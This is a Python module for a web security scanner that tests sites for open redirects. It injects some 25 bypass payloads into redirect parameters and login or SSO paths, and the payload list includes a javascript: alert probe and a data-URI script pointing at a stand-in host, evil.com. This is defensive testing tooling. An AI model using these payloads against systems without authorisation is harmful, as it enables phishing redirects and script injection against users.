"""Open Redirect Advanced — 20+ parser-differential bypass techniques for open redirect testing."""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.ext.open-redirect-advanced")

NAME = "open-redirect-advanced"
DESCRIPTION = "20+ parser-differential bypass techniques for open redirect detection"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "timeout": 10.0,
    "evil_domain": "evil.com",
}

# Common redirect parameter names
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri", "next", "return",
    "return_url", "return_to", "rurl", "dest", "destination", "redir",
    "redirect_to", "out", "view", "login_url", "continue", "target",
    "goto", "link", "forward", "to", "returnUrl", "callback", "cb",
    "returnTo", "go", "success_url", "fail_url", "ref", "site",
]


def _get_bypass_payloads(evil: str) -> list[tuple[str, str]]:
    """Generate parser-differential bypass payloads."""
    return [
        (f"//{evil}", "double-slash"),
        (f"/\\{evil}", "backslash-prefix"),
        (f"//{evil}%2F..", "percent-encoded-slash"),
        (f"/%0d/{evil}", "carriage-return"),
        (f"////{evil}", "quad-slash"),
        (f"https:{evil}", "scheme-no-slashes"),
        (f"%00//{evil}", "null-byte-prefix"),
        (f"///{evil}/%2f..", "triple-slash-traverse"),
        (f"?next=//{evil}", "query-redirect"),
        (f"@{evil}", "at-sign"),
        (f"\\.{evil}", "backslash-dot"),
        (f"https://{evil}%40target.com", "percent-encoded-at"),
        (f"//{evil}%00", "null-byte-suffix"),
        (f"https://{evil}\\@target.com", "backslash-at"),
        (f"/{evil}/%2f%2e%2e", "encoded-traverse"),
        (f"//google.com@{evil}", "auth-at-sign"),
        (f"https://google.com#{evil}", "fragment-injection"),
        (f"/%09/{evil}", "tab-prefix"),
        (f"\t//{evil}", "tab-double-slash"),
        (f"http://{evil}?trusted.com", "query-confusion"),
        (f"http://trusted.com.{evil}", "suffix-confusion"),
        (f"javascript:alert(1)//{evil}", "javascript-scheme"),
        (f"data:text/html,<script>location='{evil}'</script>", "data-uri"),
        (f"/{evil}", "single-slash-domain"),
        (f"http://{evil}#@trusted.com", "fragment-at-sign"),
    ]


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


async def active_check(url: str) -> list[ScanFinding]:
    """Test for open redirects using parser-differential bypasses."""
    findings: list[ScanFinding] = []
    timeout = _config.get("timeout", 10.0)
    evil = _config.get("evil_domain", "evil.com")
    parsed = urlparse(url)
    payloads = _get_bypass_payloads(evil)

    async with httpx.AsyncClient(
        verify=False, timeout=timeout, follow_redirects=False
    ) as client:
        # Discover redirect parameters in the existing URL
        existing_params = parse_qs(parsed.query, keep_blank_values=True)
        params_to_test = []

        # Check if any existing params might be redirect params
        for param in existing_params:
            if param.lower() in [p.lower() for p in REDIRECT_PARAMS]:
                params_to_test.append(param)

        # Also test common redirect params not already in URL
        for param in REDIRECT_PARAMS[:15]:  # Test top 15 common params
            if param not in existing_params:
                params_to_test.append(param)

        for param in params_to_test:
            for payload, bypass_type in payloads:
                test_params = dict(existing_params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    resp = await client.get(test_url)

                    # Check for redirect to evil domain
                    location = resp.headers.get("location", "")
                    is_redirect = resp.status_code in (301, 302, 303, 307, 308)

                    if is_redirect and evil in location:
                        findings.append(ScanFinding(
                            template_id=f"open_redirect_{bypass_type}",
                            name=f"Open Redirect via {bypass_type}",
                            severity="medium",
                            url=url,
                            matched_at=test_url,
                            description=(
                                f"Open redirect detected using '{bypass_type}' bypass technique. "
                                f"Parameter: {param}={payload}. "
                                f"Server redirected to: {location}"
                            ),
                            extracted=[
                                f"Parameter: {param}",
                                f"Payload: {payload}",
                                f"Bypass: {bypass_type}",
                                f"Location: {location}",
                                f"Status: {resp.status_code}",
                            ],
                            source="extension",
                            confidence="confirmed",
                            remediation=(
                                "Validate redirect targets against a strict allowlist of trusted domains. "
                                "Use relative paths only. Never rely on URL parsing alone for validation."
                            ),
                        ))
                        # Found redirect for this param — try next param
                        break

                    # Check for meta refresh or JavaScript redirect
                    if resp.status_code == 200 and evil in resp.text[:5000]:
                        body_lower = resp.text[:5000].lower()
                        if (
                            f'url={evil}' in body_lower
                            or f"location.href='{evil}" in body_lower
                            or f'location.href="{evil}' in body_lower
                            or f"location='{evil}" in body_lower
                            or f'location="{evil}' in body_lower
                            or f'window.location="{evil}' in body_lower
                            or f"http-equiv=\"refresh\"" in body_lower and evil in body_lower
                        ):
                            findings.append(ScanFinding(
                                template_id=f"open_redirect_js_{bypass_type}",
                                name=f"Open Redirect (JavaScript/Meta) via {bypass_type}",
                                severity="medium",
                                url=url,
                                matched_at=test_url,
                                description=(
                                    f"Client-side redirect to '{evil}' detected via meta refresh "
                                    f"or JavaScript. Parameter: {param}={payload}"
                                ),
                                extracted=[
                                    f"Parameter: {param}",
                                    f"Payload: {payload}",
                                    f"Bypass: {bypass_type}",
                                ],
                                source="extension",
                                confidence="firm",
                                remediation="Validate redirect URLs server-side before rendering. Use CSP to restrict navigation.",
                            ))
                            break

                except Exception as e:
                    log.debug(f"Open redirect test error ({bypass_type}): {e}")
                    continue

        # Test path-based redirects (common in login flows)
        path_payloads = [
            f"/redirect/{evil}",
            f"/login?next=//{evil}",
            f"/logout?redirect=//{evil}",
            f"/sso/redirect?url=https://{evil}",
        ]

        for path_payload in path_payloads:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path_payload}"
            try:
                resp = await client.get(test_url)
                location = resp.headers.get("location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and evil in location:
                    findings.append(ScanFinding(
                        template_id="open_redirect_path",
                        name="Open Redirect via Path",
                        severity="medium",
                        url=url,
                        matched_at=test_url,
                        description=(
                            f"Open redirect found at path-based redirect endpoint. "
                            f"Location: {location}"
                        ),
                        extracted=[
                            f"Path: {path_payload}",
                            f"Location: {location}",
                        ],
                        source="extension",
                        confidence="confirmed",
                        remediation="Validate all redirect targets against an allowlist of trusted domains.",
                    ))
            except Exception:
                continue

    return findings
